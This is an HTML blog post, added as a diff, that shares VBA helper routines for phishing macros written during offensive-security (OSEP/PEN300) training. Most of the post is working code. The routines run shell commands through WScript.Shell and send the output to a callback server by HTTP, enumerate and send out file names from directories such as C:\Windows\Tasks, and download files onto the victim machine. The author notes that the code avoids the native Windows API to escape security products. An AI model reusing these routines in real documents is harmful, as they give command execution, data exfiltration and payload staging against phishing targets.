@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="/css/highlight.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/style.css">
+    
+    
+    <title>Taha Draidia | Don&#39;t Go Phishing Blind, Watch While RunTime</title>
+    <script src="/js/highlight.min.js"></script>
+    <script> hljs.initHighlightingOnLoad(); </script>
+</head><body>
+        
+        <div id="container" class="container">
+<span class="home_button"><a href="/">Back to home</a></span>
+<h2 class="note_title">
+<a href="/posts/dont-go-phising-blind-watch-while-execution/" rel="bookmark"
+           title="Permalink to Don&#39;t Go Phishing Blind, Watch While RunTime">Don&#39;t Go Phishing Blind, Watch While RunTime</a></h2>
+
+
+<div class="note_info">
+        <div class="origin">
+            <strong>Created by:</strong><a href="https://twitter.com/tahadraidia">@tahadraidia</a> || <a href="https://tahadraidia.com">tahadraidia.com</a> 
+        </div>
+		<br />
+
+        <div class="published" title="2021-12-04 11:25:46 &#43;0000 UTC">
+            <strong>Published:</strong> <time datetime="2021-12-04">Dec 4, 2021</time>
+        </div>
+		<br />
+
+        <div class="tags" title="tags">
+        	
+        	<strong>Tags:</strong>
+        	
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/osep">OSEP</a>
+            
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/pen300">PEN300</a>
+            
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/vba">VBA</a>
+            
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/vbs">VBS</a>
+            
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/hta">HTA</a>
+            
+			
+            <a class="btn btn-sm btn-outline-dark tag-btn" href="https://tahadraidia.com/tags/http">HTTP</a>
+            
+            
+        </div>
+</div>
+
+<br>
+<p>Raise your hand if you crafted well your payload and the payload worked well in your lab machines but in the real scenario you&rsquo;re not receiving the callback! I guess all of us at some point have experienced this.</p>
+<p>To solve this I wrote a simple and yet effective set of functions that allow us to see what going on while the runtime of our script.</p>
+<p>The first function/subroutine, which I called hello simply sends an GET request to a specified server.</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">Sub Hello(message)
+	On Error GoTo Done
+	Dim MyRequest As Object
+	Set MyRequest = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;)
+	MyRequest.Open &quot;GET&quot;, _
+	&quot;http://127.0.0.1/&quot; &amp; message
+	' Send Request.
+	MyRequest.Send
+	Set MyRequest = Nothing
+	Done:
+		Exit Sub
+End Sub
+</code></pre><p>This is the main important one, since we are relying on the HTTP protocol to call home after executing an action.</p>
+<p>The second important one is ShellRun, this function run a system command and returns the captured output of the command.</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">Function ShellRun(sCmd As String) As String
+	'Run a shell command, returning the output as a string
+	Dim oShell As Object
+	Set oShell = CreateObject(&quot;WScript.Shell&quot;)
+
+	'run command
+	Dim oExec As Object
+	Dim oOutput As Object
+	Set oExec = oShell.Exec(sCmd)
+	Set oOutput = oExec.StdOut
+
+	'handle the results as they are written to and read from the StdOut object
+	Dim s As String
+	Dim sLine As String
+	While Not oOutput.AtEndOfStream
+		sLine = oOutput.ReadLine
+		If sLine &lt;&gt; &quot;&quot; Then s = s &amp; sLine &amp; vbCrLf
+	Wend
+
+	ShellRun = s
+End Function
+</code></pre><p>In conjunction with Hello, this gives us a visibility of what is going on while the runtime of our phishing script.</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">Hello (ShellRun(&quot;ping google.com&quot;))
+</code></pre><p>Bonus:</p>
+<p>One of the other helpers, I wrote is LoopThroughFiles() this print the content of the provider directory.</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">Sub LoopThroughFiles(path)
+	On Error GoTo Done
+	Dim oFSO As Object
+	Dim oFolder As Object
+	Dim oFile As Object
+	Dim i As Integer
+
+	Set oFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)
+	Set oFolder = oFSO.GetFolder(path)
+
+	For Each oFile In oFolder.Files
+	Hello (oFile.Name)
+	i = i + 1
+	Next oFile
+	Done:
+		Exit Sub
+End Sub
+</code></pre><p>The subroutine relies on Hello subroutine, this could be used as shown below:</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">LoopThroughFiles (&quot;C:\Windows\Tasks&quot;)
+</code></pre><p>I will finish this post with an extra subroutine that download text files, no binary files.</p>
+<pre tabindex="0"><code class="language-VB" data-lang="VB">Sub WantMe(pie)
+	Dim myURL As String
+	myURL = &quot;http://127.0.0.1/&quot; &amp; pie
+
+	Dim WinHttpReq As Object
+	Set WinHttpReq = CreateObject(&quot;Microsoft.XMLHTTP&quot;)
+	WinHttpReq.Open &quot;GET&quot;, myURL, False, Null, Null
+	WinHttpReq.Send
+
+	If WinHttpReq.Status = 200 Then
+		Set oStream = CreateObject(&quot;ADODB.Stream&quot;)
+		oStream.Open
+		oStream.Type = 1
+		oStream.Write WinHttpReq.responseBody
+		oStream.SaveToFile &quot;C:\Windows\Tasks\&quot; &amp; pie, 2 ' 1 = no overwrite, 2 = overwrite
+		oStream.Close
+	End If
+End Sub
+</code></pre><p>Nothing special really here, just a set of function helpers to facilitate things, if you noticed we have not used native Windows API and that&rsquo;s for a reason and the reason for that is portability of the code (few changes) when porting it VBS/HTA, also using native Windows API in Macro could be treated as a red flag by a security product.</p>
+<p>Thanks  for ready!</p>
+
+  <div class="contact">
+    <h2>Contact</h2>
+    Please feel free to ping me at <a href="https://twitter.com/tahadraidia">@tahadraidia</a>. Also you can see more of my work at <a href="https://tahadraidia.com">https://tahadraidia.com</a>.
+</div>
+</br> 
+        </div>
+        <script> hljs.initHighlightingOnLoad(); </script></body>
+</html>
